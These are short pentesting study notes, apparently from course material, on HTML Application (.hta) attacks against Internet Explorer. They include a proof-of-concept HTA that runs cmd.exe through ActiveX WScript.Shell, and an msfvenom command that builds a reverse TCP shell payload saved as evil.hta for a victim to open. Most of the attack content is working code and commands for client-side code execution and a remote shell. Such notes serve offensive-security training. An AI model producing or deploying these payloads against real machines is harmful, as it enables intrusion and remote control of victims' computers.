If an **.hta** extension is used rather than an **.html**, IE will automatically interpret is as an HTML App and offer the ability to execute it in **mshta.exe**  
  
HTML Apps allow arbitrary execution of apps directly from IE rather than downloading and manually running the executable.  
(Since this clashes w/ security boundries in the browser, an **.hta** is always executed outside of the security context of the browser)  
  
  
**Only works against IE (&, to some extent, MS Edge)  
Built into WinOS  
Compatible w/ less secure MS legacy web tech, like ActiveX  
  
  
Example POC script:  
```html
<html>  
<head>  
  
<script>  
  
var c = 'cmd.exe'  
new ActiveXObject('WScript.Shell').Run(c);  
  
</script>  
  
</head>  
<body>  
  
<script>  
  
self.close();  
  
</script>  
  
</body>  
</html>
```

*While **mstha.exe** is executing, it keeps an additional window open behind the cmd prompt.  
- Use the _**self.close()**_ method to prevent that.  
  
  
Use **msfvenom** to create a reverse tcp payload based off of _hta-powershell_  
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<local_ip> LPORT=<local_port> -f hta-psh -o /var/www/html/evil.hta
```

  
Once run from the Windows victim machine, the reverse shell will connect.  
  
There's verbiage in the materials that suggests that this won't work for MS Edge users, but mine ran fine
